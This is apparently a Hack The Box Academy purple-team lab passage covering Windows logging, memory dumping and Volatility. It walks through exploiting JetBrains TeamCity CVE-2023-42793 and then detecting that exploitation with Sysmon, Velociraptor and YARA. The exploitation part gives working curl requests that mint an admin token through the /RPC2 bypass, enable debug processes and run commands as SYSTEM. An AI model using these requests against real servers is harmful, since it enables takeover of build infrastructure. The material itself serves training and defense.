![Event Viewer displaying Event ID 5156, Windows Filtering Platform connection details.](https://academy.hackthebox.com/storage/modules/257/logging_10.png)

#### JonMon

[JonMon](https://github.com/jsecurity101/JonMon) is an open-source research project that includes a `kernel-level driver` component which is designed to collect information related to system operations such as `process creation`, `registry operations`, `file creation`, and more. In addition to the kernel-level driver component, JonMon also features a `user-mode component` that collects information about `.NET`, `RPC`, `network activity`, and other important system events.

JonMon runs as a service in all Windows Purple module targets.

![Command prompt displaying 'sc query jonmon' with service status running.](https://academy.hackthebox.com/storage/modules/257/logging_2.png)

By combining data from both the kernel-level and user-mode components, JonMon provides users with a comprehensive view of their security activity. The data collected by both components is made easily accessible to users through the Windows event log, allowing users to quickly and easily query the data and gain insights into their system operations. JonMon-generated logs can be viewed in the `Event Viewer` by navigating to `Applications and Services Logs` \> `JonMon`.

![Event Viewer displaying JonMon logs with Event ID 13 for network connection accepted.](https://academy.hackthebox.com/storage/modules/257/logging_3.png)

More details on JonMon can be found in the Github Repository [here.](https://github.com/jsecurity101/JonMon)

#### SealighterTI

The `Microsoft-Windows-Threat-Intelligence` Event Tracing for Windows (ETW) provider is a robust tool for detecting process injection and other types of attacks. Unlike user-mode hooking or in-process ETW providers, evading or tampering with the Threat-Intelligence provider is notably challenging. [SealighterTI](https://github.com/pathtofile/SealighterTI) facilitates the logging of events from the `Microsoft-Windows-Threat-Intelligence` provider into the Windows Event Log, enhancing visibility into such activities.

`SealighterTI` runs in the background on all Windows Purple module targets via a scheduled task. The events it generates are logged under `Applications and Service Logs` \> `Sealighter` as shown in the screenshot below.

![Event Viewer displaying Sealighter logs with Event ID 1, showing threat intelligence data.](https://academy.hackthebox.com/storage/modules/257/logging_5.png)

More details on `SealighterTI` can be found on the Github Repository [here](https://github.com/pathtofile/SealighterTI).

* * *

## Traffic Capturing

A batch script located at `C:\Tools\PCAP-Captures\Script\background\Traffic-Capture-Script.bat` is executed at boot via a scheduled task to initiate traffic capturing for the most common protocols. To enable more detailed traffic capturing, we can modify the script ( `set CAPTURE_FILTER=` part) to include additional protocols (ports) as needed and then double-click on the `Stop-Traffic-Capture.bat` file located on the desktop to restart traffic capturing.

The abovementioned `Stop-Traffic-Capture.bat` batch script has been placed on the desktop to streamline the process of stopping, saving, and resuming network traffic capture. This script enables users to manage the traffic capture process seamlessly at any point and ensures that the data is preserved for later analysis.

![Desktop with icons including a batch script to stop and save captured traffic.](https://academy.hackthebox.com/storage/modules/257/logging_8.png)

#### Using the Traffic Capture Script

1. **Script Location:**


The batch script is located on the desktop for easy access. The script is named `Stop-Traffic-Capture.bat`.

2. **Purpose of the Script:**
   - **Stop Traffic Capture:** Halts the current traffic capture process.
   - **Save Captured Traffic:** Saves the captured data in a `PCAP` format for further analysis.
   - **Continue Traffic Capture:** Automatically resumes the capture process without any interruptions to the workflow.
3. **Running the Script:**
   - Double-click on the `Stop-Traffic-Capture.bat` file on the desktop.
   - Once the traffic capture has been stopped and saved, it will automatically restart and continue capturing new traffic in real time.

The GIF below shows the process of extracting captured PCAP by running the script.

![GIF showcasing the process of extracting captured traffic in PCAP file format.](https://academy.hackthebox.com/storage/modules/257/captured-pcap.gif)

Captured traffic is saved in the form of PCAP files, which are commonly used for analyzing network traffic.

- **File Location:**


The captured traffic files are saved in the following directory:
`C:\Tools\PCAP-Captures\Archives`

- **PCAP Files:**


Each captured session is stored in a separate `.pcap` file, and the files are named based on the timestamp of when the capture occurred, which allows for easy identification of the traffic logs based on the capture time.


The captured traffic can be analyzed using tools such as Wireshark, which is also installed on the system at the path `C:\Program Files\Wireshark`. Here’s how you can open the files in Wireshark:

1. Launch **Wireshark** from the desktop shortcut.
2. Navigate to `File` \> `Open`.
3. Select the appropriate `.pcap` file from `C:\Tools\PCAP-Captures\Archives` to begin analyzing the captured traffic.


# Dumping & Analyzing Windows Memory

In this section, we will explore the memory dumping and analysis tools available on Windows Purple module targets, as well as how to dump and analyze the memory of a Windows Purple module target.

* * *

## Dumping Memory

Memory dumping is a vital capability in forensic investigations, enabling the capture of the current state of a system's volatile memory for detailed post-incident analysis. This snapshot provides a wealth of information, such as active processes, loaded drivers, network connections, and potential malicious artifacts that may not be visible on disk. Memory dumps are particularly useful for detecting malware, analyzing injection techniques, uncovering credentials stored in memory, and identifying other indicators of compromise that persist only in active memory during an attack.

In all Windows Purple module targets, memory dumping tools are available at the following location:

`C:\Tools\Memory-Dump`

![Memory-Dump folder containing Dumplt.exe and winpmem_mini_x64_rc2.exe applications.](https://academy.hackthebox.com/storage/modules/257/logging_11.png)

`DumpIt` is a straightforward and user-friendly tool used to create a full memory dump of a system. A memory dump can be captured as follows:

```cmd-session
C:\Tools\Memory-Dump>DumpIt.exe
  DumpIt - v1.3.2.20110401 - One click memory memory dumper
  Copyright (c) 2007 - 2011, Matthieu Suiche <http://www.msuiche.net>
  Copyright (c) 2010 - 2011, MoonSols <http://www.moonsols.com>

    Address space size:        5368709120 bytes (   5120 Mb)
    Free space size:           5687996416 bytes (   5424 Mb)

    * Destination = \??\C:\Tools\Memory-Dump\LOGGING-VM-20241126-111433.raw

    --> Are you sure you want to continue? [y/n] y
    + Processing... Success.

```

The tool will generate a full memory dump file, typically saved in the same directory as the executable, which can then be used for forensic analysis.

[Winpmem](https://github.com/Velocidex/WinPmem) is another versatile tool for capturing a full memory dump of the system. The tool requires specifying an output path where the dump file will be saved as follows:

```cmd-session
C:\Tools\Memory-Dump>C:\Tools\Memory-Dump>winpmem_mini_x64_rc2.exe memdump.raw
WinPmem64
Extracting driver to C:\Users\ADMINI~1\AppData\Local\Temp\2\pme84CC.tmp
Driver Unloaded.
Loaded Driver C:\Users\ADMINI~1\AppData\Local\Temp\2\pme84CC.tmp.
Deleting C:\Users\ADMINI~1\AppData\Local\Temp\2\pme84CC.tmp
The system time is: 12:23:28
Will generate a RAW image
 - buffer_size_: 0x1000
CR3: 0x00001AD000
 6 memory ranges:
Start 0x00002000 - Length 0x0009E000
Start 0x00100000 - Length 0x0EE9E000
Start 0x0EFA2000 - Length 0x0000F000
Start 0x0EFB6000 - Length 0x00F2F000
Start 0x0FF75000 - Length 0xB008B000
Start 0x100000000 - Length 0x40000000
max_physical_memory_ 0x140000000
Acquitision mode PTE Remapping
Padding from 0x00000000 to 0x00002000
pad
 - length: 0x2000

00% 0x00000000 .
copy_memory
 - start: 0x2000
 - end: 0xa0000

00% 0x00002000 .
Padding from 0x000A0000 to 0x00100000
pad
 - length: 0x60000

00% 0x000A0000 .
copy_memory
 - start: 0x100000
 - end: 0xef9e000

00% 0x00100000 ...............
Padding from 0x0EF9E000 to 0x0EFA2000
pad
 - length: 0x4000

04% 0x0EF9E000 .
copy_memory
 - start: 0xefa2000
 - end: 0xefb1000

04% 0x0EFA2000 .
Padding from 0x0EFB1000 to 0x0EFB6000
pad
 - length: 0x5000

04% 0x0EFB1000 .
copy_memory
 - start: 0xefb6000
 - end: 0xfee5000

04% 0x0EFB6000 .
Padding from 0x0FEE5000 to 0x0FF75000
pad
 - length: 0x90000

04% 0x0FEE5000 .
copy_memory
 - start: 0xff75000
 - end: 0xc0000000

04% 0x0FF75000 ..................................................
20% 0x41F75000 ..................................................
36% 0x73F75000 ..................................................
51% 0xA5F75000 ...........................
Padding from 0xC0000000 to 0x100000000
pad
 - length: 0x40000000

60% 0xC0000000 ..................................................
60% 0xC0000000 ..............
copy_memory
 - start: 0x100000000
 - end: 0x140000000
<SNIP>
80% 0x100000000 ..................................................
95% 0x132000000 ..............
The system time is: 12:24:28
Driver Unloaded.

```

The raw memory dump will be saved to the specified output path and will be ready for further forensic analysis.

## Analyzing Memory

All Windows Purple module targets come pre-installed with `Volatility v2` and `Volatility v3`, powerful tools for analyzing memory dumps. After capturing a memory dump from a Windows Purple module target, memory forensics could be performed using `Volatility v3` as follows (in this case, we are using Volatility's `windows.pslist` plugin to list active processes within the memory dump).

```cmd-session
C:\Tools\volatility3>python vol.py -q -f C:\Tools\Memory-Dump\LOGGING-VM-20241126-111433.raw windows.pslist
Volatility 3 Framework 2.7.0

PID     PPID    ImageFileName   Offset(V)       Threads Handles SessionId       Wow64   CreateTime      ExitTime      File output

4       0       System  0x8d81eb28b2c0  117     -       N/A     False   2024-11-20 08:10:40.000000      N/A           Disabled
88      4       Registry        0x8d81eb2ee080  4       -       N/A     False   2024-11-20 08:10:35.000000            N/A     Disabled
276     4       smss.exe        0x8d81ee0b0040  3       -       N/A     False   2024-11-20 08:10:40.000000            N/A     Disabled
384     368     csrss.exe       0x8d81ee36f080  10      -       0       False   2024-11-20 08:10:47.000000            N/A     Disabled
484     368     wininit.exe     0x8d81eec7e080  4       -       0       False   2024-11-20 08:10:47.000000            N/A     Disabled
492     476     csrss.exe       0x8d81eeca2140  9       -       1       False   2024-11-20 08:10:47.000000            N/A     Disabled
560     476     winlogon.exe    0x8d81eecc70c0  4       -       1       False   2024-11-20 08:10:47.000000            N/A     Disabled
624     484     services.exe    0x8d81eecee080  7       -       0       False   2024-11-20 08:10:47.000000            N/A     Disabled
640     484     lsass.exe       0x8d81eecea080  8       -       0       False   2024-11-20 08:10:48.000000            N/A     Disabled
744     624     svchost.exe     0x8d81ee33d080  1       -       0       False   2024-11-20 08:10:48.000000            N/A     Disabled
764     624     svchost.exe     0x8d81ee3170c0  14      -       0       False   2024-11-20 08:10:48.000000            N/A     Disabled
784     484     fontdrvhost.ex  0x8d81eed70080  5       -       0       False   2024-11-20 08:10:48.000000            N/A     Disabled
792     560     fontdrvhost.ex  0x8d81eed6f080  5       -       1       False   2024-11-20 08:10:48.000000            N/A     Disabled
868     624     svchost.exe     0x8d81eed71080  9       -       0       False   2024-11-20 08:10:49.000000            N/A     Disabled
940     624     svchost.exe     0x8d81eede2080  10      -       0       False   2024-11-20 08:10:49.000000            N/A     Disabled
1008    560     dwm.exe 0x8d81eedf3080  11      -       1       False   2024-11-20 08:10:49.000000      N/A           Disabled
312     624     svchost.exe     0x8d81eedc4080  6       -       0       False   2024-11-20 08:10:49.000000            N/A     Disabled
348     624     svchost.exe     0x8d81eedc2080  37      -       0       False   2024-11-20 08:10:49.000000            N/A     Disabled
760     624     svchost.exe     0x8d81ef53e080  2       -       0       False   2024-11-20 08:10:49.000000            N/A     Disabled
620     624     svchost.exe     0x8d81eedc9080  3       -       0       False   2024-11-20 08:10:49.000000            N/A     Disabled
884     624     svchost.exe     0x8d81ef52f0c0  2       -       0       False   2024-11-20 08:10:49.000000            N/A     Disabled
960     624     svchost.exe     0x8d81eed91080  3       -       0       False   2024-11-20 08:10:49.000000            N/A     Disabled
1140    624     svchost.exe     0x8d81ef5a1080  9       -       0       False   2024-11-20 08:10:49.000000            N/A     Disabled
1224    624     svchost.exe     0x8d81ef610080  1       -       0       False   2024-11-20 08:10:49.000000            N/A     Disabled
1304    624     svchost.exe     0x8d81ef663080  4       -       0       False   2024-11-20 08:10:49.000000            N/A     Disabled
1320    624     svchost.exe     0x8d81ef660080  5       -       0       False   2024-11-20 08:10:50.000000            N/A     Disabled
1388    624     svchost.exe     0x8d81ef6d1080  2       -       0       False   2024-11-20 08:10:50.000000            N/A     Disabled
1396    624     svchost.exe     0x8d81ef6cf080  8       -       0       False   2024-11-20 08:10:50.000000            N/A     Disabled
1404    624     svchost.exe     0x8d81ef6cc080  4       -       0       False   2024-11-20 08:10:50.000000            N/A     Disabled
1444    624     svchost.exe     0x8d81ef72c080  4       -       0       False   2024-11-20 08:10:50.000000            N/A     Disabled
1520    624     svchost.exe     0x8d81eb355080  6       -       0       False   2024-11-20 08:10:50.000000            N/A     Disabled
1532    624     svchost.exe     0x8d81eb35c080  6       -       0       False   2024-11-20 08:10:50.000000            N/A     Disabled
1552    624     svchost.exe     0x8d81eb364080  12      -       0       False   2024-11-20 08:10:50.000000            N/A     Disabled
1576    624     svchost.exe     0x8d81eb333080  9       -       0       False   2024-11-20 08:10:50.000000            N/A     Disabled
1676    624     svchost.exe     0x8d81eb318080  7       -       0       False   2024-11-20 08:10:50.000000            N/A     Disabled
1728    624     svchost.exe     0x8d81eb344080  6       -       0       False   2024-11-20 08:10:50.000000            N/A     Disabled
1828    624     svchost.exe     0x8d81ef7d4080  10      -       0       False   2024-11-20 08:10:50.000000            N/A     Disabled
1876    624     svchost.exe     0x8d81eb380080  5       -       0       False   2024-11-20 08:10:50.000000            N/A     Disabled
1924    624     svchost.exe     0x8d81eb391080  5       -       0       False   2024-11-20 08:10:50.000000            N/A     Disabled
1688    624     svchost.exe     0x8d81ef898080  6       -       0       False   2024-11-20 08:10:51.000000            N/A     Disabled
1820    624     svchost.exe     0x8d81ef893080  8       -       0       False   2024-11-20 08:10:51.000000            N/A     Disabled
2056    624     svchost.exe     0x8d81ef878080  6       -       0       False   2024-11-20 08:10:51.000000            N/A     Disabled
2076    624     svchost.exe     0x8d81ef908080  2       -       0       False   2024-11-20 08:10:51.000000            N/A     Disabled
2136    624     svchost.exe     0x8d81ef8ea080  15      -       0       False   2024-11-20 08:10:51.000000            N/A     Disabled
2392    1552    cmd.exe 0x8d81ef95c080  0       -       0       False   2024-11-20 08:10:52.000000      2024-11-20 13:10:54.000000    Disabled
2504    2392    conhost.exe     0x8d81efa9c080  4       -       0       False   2024-11-20 08:10:53.000000            N/A     Disabled
2580    624     spoolsv.exe     0x8d81efb05080  11      -       0       False   2024-11-20 08:10:53.000000            N/A     Disabled
2664    624     svchost.exe     0x8d81efb2d080  14      -       0       False   2024-11-20 08:10:54.000000            N/A     Disabled
2672    624     svchost.exe     0x8d81efb4a080  5       -       0       False   2024-11-20 08:10:54.000000            N/A     Disabled
2680    624     svchost.exe     0x8d81efb47080  10      -       0       False   2024-11-20 08:10:54.000000            N/A     Disabled
2692    624     svchost.exe     0x8d81efb43080  4       -       0       False   2024-11-20 08:10:54.000000            N/A     Disabled
2748    624     osqueryd.exe    0x8d81efb37080  3       -       0       False   2024-11-20 08:10:54.000000            N/A     Disabled
2784    624     svchost.exe     0x8d81efb26080  6       -       0       False   2024-11-20 08:10:54.000000            N/A     Disabled
2800    624     svchost.exe     0x8d81ef424080  3       -       0       False   2024-11-20 08:10:54.000000            N/A     Disabled
2808    624     ssh-agent.exe   0x8d81ef423080  2       -       0       False   2024-11-20 08:10:54.000000            N/A     Disabled
2816    624     sshd.exe        0x8d81ef41d0c0  2       -       0       False   2024-11-20 08:10:54.000000            N/A     Disabled
2844    624     Sysmon64.exe    0x8d81efbd6080  16      -       0       False   2024-11-20 08:10:54.000000            N/A     Disabled
2860    624     TeamCityServic  0x8d81efbc1080  5       -       0       True    2024-11-20 08:10:54.000000            N/A     Disabled
2888    624     vm3dservice.ex  0x8d81efb8e080  4       -       0       False   2024-11-20 08:10:55.000000            N/A     Disabled
2896    624     VGAuthService.  0x8d81efb8c080  2       -       0       False   2024-11-20 08:10:55.000000            N/A     Disabled
2904    624     vmtoolsd.exe    0x8d81efb90080  13      -       0       False   2024-11-20 08:10:55.000000            N/A     Disabled
2912    624     svchost.exe     0x8d81efbbf080  3       -       0       False   2024-11-20 08:10:55.000000            N/A     Disabled
2924    624     svchost.exe     0x8d81efbb9400  6       -       0       False   2024-11-20 08:10:55.000000            N/A     Disabled
2948    624     svchost.exe     0x8d81efc4d080  4       -       0       False   2024-11-20 08:10:55.000000            N/A     Disabled
2956    624     velociraptor.e  0x8d81efc4e080  10      -       0       False   2024-11-20 08:10:55.000000            N/A     Disabled

```


# Usage Example: JetBrains TeamCity CVE-2023-42793

## Introduction

In today's fast-paced software development landscape, Continuous Integration and Continuous Deployment (CI/CD) servers are essential for automating build, test, and deployment workflows. Tools like [JetBrains TeamCity](https://www.jetbrains.com/teamcity/) streamline the integration of code changes from multiple developers, enabling frequent and reliable software releases. TeamCity, a popular CI/CD platform, is trusted by development teams worldwide for its robust feature set and user-friendly interface. However, like all software, it is not immune to vulnerabilities that can threaten the security of the development pipeline.

This section provides a comprehensive analysis of [CVE-2023-42793](https://nvd.nist.gov/vuln/detail/cve-2023-42793), a critical vulnerability in TeamCity, detailing its underpinnings, exploitation techniques, mitigation strategies, and detection strategies.

This section is divided into two parts:

- `CVE-2023-42793 Analysis and Exploitation`: This part focuses on the technical details of the vulnerability, how it can be exploited, and strategies to mitigate it.
- `Post-Exploitation Forensic Analysis`: This part examines the forensic capabilities of Windows Purple Module targets by analyzing the system post-exploitation. It demonstrates how artifacts left by the attack can be identified and analyzed within a Windows Purple Module target to better understand the exploit’s impact and enhance our understanding of the attack from a defensive security perspective.

## CVE-2023-42793 Analysis and Exploitation

The [Sonar Vulnerability Research Team](https://www.sonarsource.com/blog/teamcity-vulnerability/) identified a critical flaw in JetBrains TeamCity, tracked as `CVE-2023-42793`. This vulnerability allows unauthenticated attackers to execute arbitrary code on the server by bypassing authorization mechanisms. With a CVSS base score of `9.8`, all versions of TeamCity up to `2023.05.3` are affected.

The vulnerability exploits a weakness in `request interceptors` for paths ending with `/RPC2`. By bypassing authorization checks, attackers can gain full control over the TeamCity server.

#### Understanding the Vulnerability

##### Request Interceptors in Java

Request interceptors are components in Java web applications that process HTTP requests and responses. They are often used for tasks like logging, authentication, authorization, and modifying requests or responses. These interceptors ensure consistent handling and security across application endpoints.

TeamCity uses request interceptors to handle actions on every HTTP request, including authorization checks. The list of interceptors being used by the TeamCity server can be found in the configuration file `buildServerSpringWeb.xml`.

```java
 <mvc:interceptors>
    <ref bean="externalLoadBalancerInterceptor"/>
    <ref bean="agentsLoadBalancer"/>
    <ref bean="calledOnceInterceptors"/>
    <ref bean="pageExtensionInterceptor"/>
  </mvc:interceptors>

```

##### Authorization Bypass

The vulnerable interceptor is `calledOnceInterceptors`, which is actually an object of the `RequestInterceptors` class. We can see that when constructing the object for the `RequestInterceptors` class, several Java beans are passed to it as a list, including `authorizedUserInterceptor`.

```java
<bean id="calledOnceInterceptors" class="jetbrains.buildServer.controllers.interceptors.RequestInterceptors">
    <constructor-arg index="0">
      <list>
        <ref bean="mainServerInterceptor"/>
        <ref bean="registrationInvitations"/>
        <ref bean="projectIdConverterInterceptor"/>
        <ref bean="authorizedUserInterceptor"/>   <!-- HERE -->
        <ref bean="twoFactorAuthenticationInterceptor"/>
        <ref bean="firstLoginInterceptor"/>
        <ref bean="pluginUIContextProvider"/>
        <ref bean="callableInterceptorRegistrar"/>
      </list>
    </constructor-arg>
  </bean>

```

The `RequestInterceptors` class intercepts HTTP requests through its `preHandle` method. Within this method, it calls the `requestPreHandlingAllowed` method, which checks a list of path expressions stored in `myPreHandlingDisabled`. If the requested path is not found in this list, pre-handling is applied. Notably, the list includes a wildcard path `/**` as an entry in `myPreHandlingDisabled`.

_jetbrains.buildServer.controllers.interceptors.RequestInterceptors_

```java
public RequestInterceptors(@NotNull List<HandlerInterceptor> var1) {
    // ...
    this.myPreHandlingDisabled.addPath("/**" + XmlRpcController.getPathSuffix());

<SNIP>

```

The initial path expression starts with the static string `/**` and is appended by the return value of the `XmlRpcController.getPathSuffix()` method, which is the static string `/RPC2`. Therefore, the resulting path expression is `/**/RPC2`. This means that any request matching this path will bypass pre-handling interceptors, and consequently, no authorization check will be performed for these requests.

Notably, there’s a wildcard present in the expression `/**/RPC2`, which implies that any request sent by an attacker to a path ending with `/RPC2` will bypass the authorization check.

* * *

#### Exploitation Process

Let's navigate to the bottom of this section and click on ' `Click here to spawn the target system!`'. Then, let's RDP into the target IP using the provided credentials. The vast majority of the actions/commands covered from this point up to the end of this section can be replicated inside the target, offering a more comprehensive grasp of the topics presented.

Allow the target to run for at least 5 minutes after spawning to ensure that all services have fully initialized (including Velociraptor).

##### Obtaining an Authentication Token

TeamCity’s REST API includes an endpoint to create user authentication tokens by sending an HTTP POST request to the `/app/rest/users/{userLocator}/tokens/{name}` endpoint. This endpoint additionally allows us to provide a name for this token via the `{name}` request path parameter. If this value is set to `RPC2`, the request path will become `/app/rest/users/{userLocator}/tokens/RPC2` and will bypass the authorization check.

Typically, the first user with an ID of `1` is the `Administrator` account created during the initial installation. Thus, we can try to use the string `id:1` as the value for the `userLocator` parameter and attempt to issue a new authentication token for the Administrator user using this HTTP `POST` request.

```shell
curl -X POST http://<Target_IP>/app/rest/users/id:1/tokens/RPC2

<?xml version="1.0" encoding="UTF-8" standalone="yes"?><token name="RPC2" creationTime="2024-11-13T06:55:16.176-06:00" value="eyJ0eXAiOiAiVENWMiJ9.dWRYeEc2dFM3X2VuRV9yZTJCbFpOcUloNWVV.Y2M0ODIzZGEtMTUyNy00NmY3LThiNzgtM2E0M2YzMmY0YjQ4"/>

```

The response provides a valid Administrator token.

##### Enabling Debug Mode for RCE

After acquiring the Administrator authentication token, one approach to achieve RCE on the server is to exploit the debug endpoint in the REST API at `/app/rest/debug/processes`. Access to this endpoint is restricted by the `rest.debug.processes.enable` configuration option, which is disabled by default. Therefore, we must first enable this option with the following request.

```shell
curl -H "Authorization: Bearer eyJ0eXAiOiAiVENWMiJ9.dWRYeEc2dFM3X2VuRV9yZTJCbFpOcUloNWVV.Y2M0ODIzZGEtMTUyNy00NmY3LThiNzgtM2E0M2YzMmY0YjQ4" -X POST "http://<Target_IP>/admin/dataDir.html?action=edit&fileName=config%2Finternal.properties&content=rest.debug.processes.enable=true"

```

We must also refresh the server to apply the debug mode.

```shell
curl -H "Authorization: Bearer eyJ0eXAiOiAiVENWMiJ9.dWRYeEc2dFM3X2VuRV9yZTJCbFpOcUloNWVV.Y2M0ODIzZGEtMTUyNy00NmY3LThiNzgtM2E0M2YzMmY0YjQ4" "http://<Target_IP>/admin/admin.html?item=diagnostics&tab=dataDir&file=config/internal.properties"

    <!DOCTYPE html>
    <html lang="en" class="admin-ui">
      <head>
        <title>TeamCity</title>

<link rel="Shortcut Icon" href="/favicon.ico?v10" type="image/x-icon" sizes="16x16 32x32"/>
<meta charset="UTF-8">

<meta name="format-detection" content="telephone=no"/>
<SNIP>

```

##### Executing Commands

Now we can run arbitrary shell commands on the server with the following request to the `/app/rest/debug/processes` endpoint.

```shell
curl -H "Authorization: Bearer eyJ0eXAiOiAiVENWMiJ9.dWRYeEc2dFM3X2VuRV9yZTJCbFpOcUloNWVV.Y2M0ODIzZGEtMTUyNy00NmY3LThiNzgtM2E0M2YzMmY0YjQ4" -X POST "http://<Target_IP>/app/rest/debug/processes?exePath=cmd.exe&params=/c%20whoami"

StdOut:nt authority\system

StdErr:
Exit code: 0
Time: 107ms

```

* * *

#### Mitigation

JetBrains has patched this vulnerability in TeamCity version `2023.05.4`, which was released on 2023-09-18. Thus, upgrading to this version is advised to effectively mitigate the vulnerability.

* * *

## Post-Exploitation Forensic Analysis

Detecting exploitation attempts of the TeamCity RCE vulnerability can be achieved through the analysis of event logs and network traffic for indicators of compromise, among other methods. This part provides guidance on leveraging Windows event logs, Sysmon logs, and captured network traffic within the Windows Purple Module target to perform forensic analysis and identify evidence of exploitation related to the TeamCity RCE vulnerability.

Ensure that the target has sufficient lifetime to conduct the forensic analysis effectively. If the target's lifetime is insufficient, extend it as necessary before proceeding.

Once the attack part has been completed and the target's lifetime has been confirmed or extended, connect to the Windows Purple Module target to perform the forensic analysis.

#### Windows Log Analysis

On Windows systems, monitoring Event ID `4688` (A new process has been created) or Event ID `1` (Sysmon: process creation) can help identify unexpected processes initiated by TeamCity. These logs can be accessed via the `Windows Event Viewer`.

To access Sysmon logs:

- Open the Event Viewer by typing `Event Viewer` in the Windows search bar and selecting the application.
- In the Event Viewer, navigate to `Applications and Services Logs` \> `Microsoft` \> `Windows` \> `Sysmon` \> `Operational`.

Review the logs for anomalies, such as unexpected parent-child process relationships. For example, TeamCity spawning unusual processes may indicate exploitation. The screenshot below highlights an unusual interaction between TeamCity's `java.exe` process and `cmd.exe`, where the latter executes a `whoami` command captured in Sysmon (Event ID 1) logs following the attack.

![Process execution details showing cmd.exe running whoami.exe, parent process java.exe.](https://academy.hackthebox.com/storage/modules/257/sysmon1_tc.png)

#### TeamCity Log Analysis

After reviewing the Cybersecurity Advisory available at [https://www.cisa.gov/sites/default/files/2023-12/aa23-347a-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally\_0.pdf](https://www.cisa.gov/sites/default/files/2023-12/aa23-347a-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally_0.pdf), we have identified several Indicators of Compromise (IOCs) that can help us determine if TeamCity has been compromised in our environment.

Let's focus on the string `internal.properties by user` from `APPENDIX A`. Instead of manually logging into the TeamCity host and reviewing the `teamcity-server.log` file for occurrences of the string, we can leverage `Velociraptor` to achieve this remotely. Using a straightforward `YARA` rule, we can automate the search for the string by leveraging `Velociraptor` on the Windows Purple module target (TeamCity host), accommodating potential variations in log names and locations.

1. Log into Velociraptor and click on the downward arrow next to the `Search clients` bar, then select `Show All`. We should now see a display indicating that Velociraptor is fully initialized and operational.

![Velociraptor Response interface showing a connected client Logging-VM with Windows Server 2019.](https://academy.hackthebox.com/storage/modules/257/velo1.png)

1. Click on the `crosshair` icon, then on the `+` icon to initiate a `New Hunt` and configure it as follows.

![Velociraptor Response interface with options to create a new hunt and view connected clients.](https://academy.hackthebox.com/storage/modules/257/velo2.png)

![Configure Hunt interface for deploying Yara rule with options for expiry, conditions, and estimated affected clients.](https://academy.hackthebox.com/storage/modules/257/velo3.png)

1. Click on `Select Artifacts` and choose `Windows.Search.Yara`.

![Configure Hunt interface for deploying Yara rule with options for expiry, conditions, and estimated affected clients](https://academy.hackthebox.com/storage/modules/257/velo4.png)

![Create Hunt interface selecting Windows.Search.Yara artifact with parameters for Yara rule configuration.](https://academy.hackthebox.com/storage/modules/257/velo5.png)

1. Click on `Configure Parameters`, select `Windows.Search.Yara` again, and configure as follows.

![Create Hunt interface selecting Windows.Search.Yara artifact with parameters for Yara rule configuration.](https://academy.hackthebox.com/storage/modules/257/velo6.png)

![Velociraptor interface showing 'Create Hunt: Configure artifact parameters' with fields for artifact name, Yara rule, and NTFS cache time.](https://academy.hackthebox.com/storage/modules/257/velo7.png)

1. Click `Launch` to start the hunt.

![Velociraptor interface for configuring artifact parameters with fields for artifact name, Yara rule, and NTFS cache time.](https://academy.hackthebox.com/storage/modules/257/velo8.png)

1. Once the hunt is created, click on it and press the `▶` icon.

![Velociraptor interface showing hunt details with artifact names, hunt ID, and Yara rule configuration.](https://academy.hackthebox.com/storage/modules/257/velo9.png)

1. After a few minutes, check the `Notebook` tab, which should display the results of the hunt.

![Velociraptor interface displaying hunt results with Yara rule matches, file paths, and hit details.](https://academy.hackthebox.com/storage/modules/257/velo10.png)

1. Take note of the returned path and use Velociraptor’s remote shell functionality to further investigate the log and verify if there is an actual compromise. The log name and path turned out to be the default ones after all.

- Navigate to the client identified earlier and click on the Client ID.

![Velociraptor interface showing client search results with details like client ID, hostname, and OS version.](https://academy.hackthebox.com/storage/modules/257/velo1.png)

- Click on the `>Shell` icon.

![Velociraptor interface displaying client details with information on client ID, agent version, and operating system.](https://academy.hackthebox.com/storage/modules/257/velo11.png)

- Execute `cat C:\TeamCity\logs\teamcity-server.log` to review the content of the log. Click on the `eye` or `Load Output` icon to load the log output.

![Velociraptor interface with a PowerShell command to view TeamCity server logs.](https://academy.hackthebox.com/storage/modules/257/velo12.png)![Velociraptor interface with a PowerShell command to display TeamCity server logs.](https://academy.hackthebox.com/storage/modules/257/velo13.png)

1. Search for `internal.properties by user` in the log. The following part of the log is indicative of a successful compromise.

![Velociraptor interface displaying PowerShell output of TeamCity server log entries.](https://academy.hackthebox.com/storage/modules/257/velo14.png)

#### Memory Analysis

As previously noted, the presence of a request containing `cmd.exe&params=` is an indicator of potential compromise.

As an alternative investigation method, the memory of the host system can be dumped and analyzed using a simple YARA rule designed to search the memory dump for occurrences of `cmd.exe&params=` as follows.

```cmd-session
C:\Tools\Memory-Dump>DumpIt.exe
  DumpIt - v1.3.2.20110401 - One click memory memory dumper
  Copyright (c) 2007 - 2011, Matthieu Suiche <http://www.msuiche.net>
  Copyright (c) 2010 - 2011, MoonSols <http://www.moonsols.com>

    Address space size:        5368709120 bytes (   5120 Mb)
    Free space size:           5687996416 bytes (   5424 Mb)

    * Destination = \??\C:\Tools\Memory-Dump\LOGGING-VM-20241126-111433.raw

    --> Are you sure you want to continue? [y/n] y
    + Processing... Success.

```

```yara
rule Detect_Cmd_Parameters {
    meta:
        description = "Detects the presence of 'cmd.exe&params=' string in memory"
        author = "Your Name"
        date = "2024-11-26"

    strings:
        $string1 = "cmd.exe&params=" ascii

    condition:
        $string1
}

```

```cmd-session
c:\Tools\yara> yara.exe teamcity.yar C:\Tools\Memory-Dump\LOGGING-VM-20241126-111433.raw
Detect_Cmd_Parameters C:\Tools\Memory-Dump\LOGGING-VM-20241126-111433.raw

```

The YARA rule was triggered because the string `cmd.exe&params=` was found in the dumped memory.

We could achieve similar results by using `Process Hacker` to examine the memory space of the `java.exe` process as follows after the attack part has concluded.

1. Launch `Process Hacker` with administrative privileges, locate the `TeamCityService` process in the interface, and expand it to find the associated child `java.exe` process.

![Process Hacker showing TeamCityService.exe with cmd.exe and java.exe as subprocesses.](https://academy.hackthebox.com/storage/modules/257/ph1.png)

1. Right-click on the `java.exe` process, select `Properties`, navigate to the `Memory` tab, and access the process's memory details.

![Process Hacker showing java.exe properties with details like command line, current directory, and parent process.](https://academy.hackthebox.com/storage/modules/257/ph2.png)

1. In the `Memory` tab, click `Strings`, proceed with the default parameters, and confirm with `OK` to scan readable strings in memory.

![Process Hacker showing java.exe memory properties with base addresses and protection types.](https://academy.hackthebox.com/storage/modules/257/ph3.png)

![Process Hacker showing java.exe memory properties with string search options for minimum length and memory regions.](https://academy.hackthebox.com/storage/modules/257/ph4.png)

1. After the string scan completes, click `Filter`, choose `Contains (case-insensitive)`, enter `cmd.exe&params=` as the keyword, and click `OK` to search for matches.

